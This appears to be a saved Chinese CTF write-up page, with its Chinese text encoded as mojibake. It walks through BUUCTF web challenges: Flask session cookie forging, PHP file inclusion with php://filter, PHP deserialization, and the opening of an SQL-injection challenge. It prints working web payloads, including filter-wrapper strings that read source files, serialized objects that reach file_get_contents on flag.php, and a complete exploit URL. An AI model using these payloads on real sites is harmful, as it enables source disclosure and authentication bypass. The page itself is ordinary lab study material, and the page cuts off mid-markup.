src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200903205415553.png" alt="image-20200903205415553"></p><h3 id><a href="#" class="headerlink" title=" "></a> </h3><h1 id="å¼€å‘"><a href="#å¼€å‘" class="headerlink" title="å¼€å‘"></a>å¼€å‘</h1><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>å­¦ä¹ ä¸€ä¸‹tornado</p><p><a href="https://blog.csdn.net/belalds/article/details/80575755" target="_blank" rel="noopener">https://blog.csdn.net/belalds/article/details/80575755</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""ä¸»è·¯ç”±å¤„ç†ç±»"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""å¯¹åº”httpçš„getè¯·æ±‚æ–¹å¼"""</span></span><br><span class="line">        self.write(<span class="string">"Hello Itcast!"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/"</span>, IndexHandler),</span><br><span class="line">    ])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure><ol><li>tornado.web</li></ol><p>tornadoçš„åŸºç¡€webæ¡†æ¶æ¨¡å—</p><ul><li><strong>RequestHandler</strong></li></ul><p>å°è£…äº†å¯¹åº”ä¸€ä¸ªè¯·æ±‚çš„æ‰€æœ‰ä¿¡æ¯å’Œæ–¹æ³•ï¼Œwrite(å“åº”ä¿¡æ¯)å°±æ˜¯å†™å“åº”ä¿¡æ¯çš„ä¸€ä¸ªæ–¹æ³•ï¼›å¯¹åº”æ¯ä¸€ç§httpè¯·æ±‚æ–¹å¼ï¼ˆgetã€postç­‰ï¼‰ï¼ŒæŠŠå¯¹åº”çš„å¤„ç†é€»è¾‘å†™è¿›åŒåçš„æˆå‘˜æ–¹æ³•ä¸­ï¼ˆå¦‚å¯¹åº”getè¯·æ±‚æ–¹å¼ï¼Œå°±å°†å¯¹åº”çš„å¤„ç†é€»è¾‘å†™åœ¨get()æ–¹æ³•ä¸­ï¼‰ï¼Œå½“æ²¡æœ‰å¯¹åº”è¯·æ±‚æ–¹å¼çš„æˆå‘˜æ–¹æ³•æ—¶ï¼Œä¼šè¿”å›â€œ<strong>405: Method Not Allowed</strong>â€é”™è¯¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""ä¸»è·¯ç”±å¤„ç†ç±»"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span>  <span class="comment"># æˆ‘ä»¬ä¿®æ”¹äº†è¿™é‡Œ</span></span><br><span class="line">        <span class="string">"""å¯¹åº”httpçš„postè¯·æ±‚æ–¹å¼"""</span></span><br><span class="line">        self.write(<span class="string">"Hello Itcast!"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/"</span>, IndexHandler),</span><br><span class="line">    ])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure><ul><li><strong>Application</strong></li></ul><p>Tornado Webæ¡†æ¶çš„æ ¸å¿ƒåº”ç”¨ç±»ï¼Œæ˜¯ä¸æœåŠ¡å™¨å¯¹æ¥çš„æ¥å£ï¼Œé‡Œé¢ä¿å­˜äº†è·¯ç”±ä¿¡æ¯è¡¨ï¼Œå…¶åˆå§‹åŒ–æ¥æ”¶çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ä¸€ä¸ªè·¯ç”±ä¿¡æ¯æ˜ å°„å…ƒç»„çš„åˆ—è¡¨ï¼›å…¶listen(ç«¯å£)æ–¹æ³•ç”¨æ¥åˆ›å»ºä¸€ä¸ªhttpæœåŠ¡å™¨å®ä¾‹ï¼Œå¹¶ç»‘å®šåˆ°ç»™å®šç«¯å£ï¼ˆ<strong>æ³¨æ„ï¼šæ­¤æ—¶æœåŠ¡å™¨å¹¶æœªå¼€å¯ç›‘å¬</strong>ï¼‰ã€‚</p><p><strong>æ€»ç»“Tornado Webç¨‹åºç¼–å†™æ€è·¯</strong></p><ol><li>åˆ›å»ºwebåº”ç”¨å®ä¾‹å¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªåˆå§‹åŒ–å‚æ•°ä¸ºè·¯ç”±æ˜ å°„åˆ—è¡¨ã€‚</li><li>å®šä¹‰å®ç°è·¯ç”±æ˜ å°„åˆ—è¡¨ä¸­çš„handlerç±»ã€‚</li><li>åˆ›å»ºæœåŠ¡å™¨å®ä¾‹ï¼Œç»‘å®šæœåŠ¡å™¨ç«¯å£ã€‚</li><li>å¯åŠ¨å½“å‰çº¿ç¨‹çš„IOLoopã€‚</li></ol><h2 id="HCTF-2018-adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰"><a href="#HCTF-2018-adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰" class="headerlink" title="[HCTF 2018]adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰"></a>[HCTF 2018]adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰</h2><p>å‘ç°åªèƒ½adminæ‰èƒ½ç™»å½•è·å–flag</p><p>ä¸»è¦å­¦ä¹ ä¸€ä¸‹flaskä¸­çš„sessionä¼ªé€ </p><p><strong>sessionä¸€èˆ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼Œè€Œåœ¨flaskä¸­ï¼Œsessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”flaskä¸­å¯¹æ•°æ®ä»…ä»…è¿›è¡Œäº†ç­¾åï¼Œç­¾åä¸»è¦ç›®çš„æ˜¯é˜²æ­¢ç¯¡æ”¹ï¼Œä½†å´æ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚æ‰€ä»¥å°±ä¼šäº§ç”Ÿä¸€äº›å®‰å…¨é—®é¢˜ã€‚</strong></p><p>åœ¨è¿™ä¸ªé¢˜ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªæ¥è§£é¢˜</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹è‡ªå·±æ³¨å†Œç”¨æˆ·testçš„cookieï¼Œä¹‹åè¿›è¡Œè§£ç ï¼Œå¯ä»¥å‚è€ƒpç‰›çš„è„šæœ¬ï¼Œä¹Ÿå¯ä»¥ä¸Šgithubä¸Šæ‰¾flask-session-managerä¹‹ådoneä¸‹æ¥</p><p>æˆ‘è¿™é‡Œç”¨çš„æ˜¯python2.7</p><p>è§£å¯†:<code>python flask_session_manager2.py decode -c -s # -cæ˜¯flask cookieé‡Œçš„sessionå€¼ -så‚æ•°æ˜¯SECRET_KEY</code><br> åŠ å¯†:<code>python flask_session_manager2.py encode -s -t # -så‚æ•°æ˜¯SECRET_KEY -tå‚æ•°æ˜¯sessionçš„å‚ç…§æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯sessionè§£å¯†åçš„æ ¼å¼</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU</span><br><span class="line">&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs</span><br></pre></td></tr></table></figure><p>ä¹‹åè¿›è¡Œæ”¹å¯†ç ç™»å½•å°±å¯ä»¥ã€‚</p><h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret</h2><p>ä¸€ç›´æŸ¥çœ‹æºç æœ€ååªéœ€è¦ç”¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«å°±å¯ä»¥è¯»å‡ºflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>ç›´æ¥è¯»å–flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰</h2><p>è€ƒå¯Ÿphpååºåˆ—åŒ–ï¼Œå…ˆä¸‹è½½www.zipé‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰class.phpï¼Œindex.phpï¼Œflag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­é€»è¾‘å°±æ˜¯å¯†ç ä¸º100ï¼Œå¹¶ä¸”username=â€™adminâ€˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $username = <span class="string">"admin"</span>;</span><br><span class="line"><span class="keyword">private</span> $password = <span class="string">"100"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Name();</span><br><span class="line">$a = serialize($a); </span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="comment">//O:4:"Name":3:&#123;s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";&#125;</span></span><br></pre></td></tr></table></figure><p>æœ€åè¿›è¡Œurlç¼–ç å°±è¡Œã€‚</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;  <span class="comment">//textçš„å†…å®¹ä¸ºwelcome to the zjctf</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;  <span class="comment">//fileçš„å†…å®¹ä¸èƒ½åŒ…å«flag</span></span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);  <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹æºç çŸ¥é“å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ä¾æ¬¡åˆ¤æ–­</p><p>textçš„å†…å®¹ä¸ºwelcome to the zjctfï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨dataåè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure><p>ä¹‹åæ˜¯fileï¼Œé¢˜ä¸­å·²ç»æç¤ºäº†useless.phpï¼Œè¯´æ˜æˆ‘ä»¬é¦–å…ˆå¾—æ‹¿å‡ºæºç ï¼Œä¹‹ååŒ…å«è¿™ä¸ªæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p>æ‹¿å‡ºæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯passwordï¼Œå¾ˆæ˜æ˜¾æ˜¯åºåˆ—åŒ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å°±æœ‰flag</p><h2 id="ç½‘é¼æ¯-2018-Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰"><a href="#ç½‘é¼æ¯-2018-Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰"></a>[ç½‘é¼æ¯ 2018]Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰</h2><p>é¦–å…ˆå‘ç°ä¿¡æ¯æ³„éœ²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;user.php.bak</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//åˆ›å»ºä¸€ä¸ªcurlèµ„æº</span></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">       <span class="comment">//è®¾ç½®urlå’Œç›¸åº”çš„é€‰é¡¹</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">      <span class="comment">//æŠ“å–urlå¹¶ä¼ é€’ç»™æµè§ˆå™¨</span></span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">//å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</span></span><br><span class="line">        curl_close($ch);</span><br><span class="line"><span class="comment">//å”¯ä¸€çš„å‚æ•°æ˜¯curl_init()å‡½æ•°è¿”å›çš„å¥æŸ„</span></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾äº†å¥½é•¿æ—¶é—´ï¼Œæ‰¾ä¸åˆ°æ³¨å…¥ç‚¹</p><p>åæ¥å‘ç°ï¼Œç™»å½•ä¹‹åï¼Œå¯ä»¥æŸ¥çœ‹ä¸€äº›ä¿¡æ¯</p><p>å¹¶ä¸”å¾ˆé‡è¦çš„æ˜¯view.phpä¸­noæ˜¯å¯ä»¥æ³¨å…¥çš„</p><figure class="highlight python"><table><tr><td 